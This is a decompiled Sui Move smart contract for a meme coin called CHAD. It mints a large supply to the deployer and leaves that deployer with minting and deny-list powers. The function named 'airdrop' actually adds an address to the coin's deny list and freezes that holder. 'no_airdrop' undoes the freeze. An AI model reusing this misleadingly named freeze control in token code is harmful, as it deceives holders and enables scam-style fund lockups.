module 0xbe7aa33b3d45798ecb663ed6c031b2e86c1ec0450462e9a9687bfd5bb718264d::chad {
    struct CHAD has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHAD>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: CHAD, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHAD>(arg0, 9, b"CHAD", b"Sui Chad", b"Giga while also Sui while also chad", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://api.movepump.com/uploads/IMG_6648_ea88388af9.jpeg")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHAD>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHAD>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<CHAD>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CHAD>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHAD>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

